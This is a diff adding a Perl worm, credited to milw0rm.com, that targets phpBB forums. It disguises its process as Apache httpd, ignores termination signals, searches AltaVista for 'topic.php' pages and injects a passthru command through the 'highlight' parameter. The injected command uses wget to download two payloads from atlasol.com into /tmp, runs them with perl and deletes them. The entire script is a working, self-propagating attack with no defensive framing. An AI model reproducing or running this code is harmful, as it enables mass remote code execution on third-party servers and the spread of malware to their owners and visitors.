@@ -1,0 +1,75 @@
+#!/usr/bin/perl
+
+################################################################################
+#  ------------------------------------------------------------------------    #
+#  Severino Honorato - /server irc.priv8crew.info #Priv8crew - ssh.D.Worm      #
+#                                                                              #
+################################################################################
+
+
+use IO::Socket;
+use LWP::Simple;
+my $processo = "/usr/local/apache/bin/httpd -DSSL";
+$SIG{"INT"} = "IGNORE";
+$SIG{"HUP"} = "IGNORE";
+$SIG{"TERM"} = "IGNORE";
+$SIG{"CHLD"} = "IGNORE";
+$SIG{"PS"} = "IGNORE";
+
+$0="$processo"."\0"x16;;
+my $pid=fork;
+exit if $pid;
+die "Problema com o fork: $!" unless defined($pid);
+
+while(1){
+@vul = "";
+$a=0;
+$numero = int rand(999);
+$procura = "topic.php?t=$numero";
+
+######################################
+for($n=0;$n<1111;$n += 10){
+
+  @cade = get("http://www.altavista.com/web/results?itag=wrx&q=$procura&kgs=1&kls=0&stq=$n") or next;
+  $ae = "@cade";
+  #print $ae;
+  while ($ae=~ m/<a class=\'res\' href=\'.*?\'>/){
+    $ae=~ s/<a class=\'res\' href=\'(.*?)\'>/$1/;
+    $uber=$1;
+
+    $uber =~ s/ //g;
+    $uber =~ s/<b>//g;
+    $uber =~ s/<\/b>//g;
+    $uber =~ s/<wbr>//g;
+
+    if ($uber =~/&/){
+      $nu = index $uber, '&';
+      $uber = substr($uber,0,$nu);
+    }
+    $vul[$a] = $uber;
+    $a++
+  }
+}
+
+#########################
+
+
+$cmd = "&rush=%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B%20cd /tmp;wget 
+atlasol.com/.zk/sess_189f0f0889555397a4de5485dd611111;wget atlasol.com/.zk/sess_189f0f0889555397a4de5485dd611112;perl 
+sess_189f0f0889555397a4de5485dd611112;rm sess_189f0f0889555397a4de5485dd611112;perl 
+sess_189f0f0889555397a4de5485dd611111;rm 
+sess_189f0f0889555397a4de5485dd611111%3B%20%65%63%68%6F%20%5F%45%4E%44%5F&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5F%47%45%54%5F%56%41%52%53%5B%72%75%73%68%5D%29.%2527';";
+
+$b = scalar(@vul);
+
+for($a=0;$a<=$b;$a++)
+{
+$sitevul = $vul[$a] . $cmd;
+if($sitevul !~/http/){ $sitevul = 'http://' . $sitevul; }
+
+$teste1 = get($sitevul) or next;
+$teste1 = "";
+}
+}
+
+# milw0rm.com [2005-01-04]
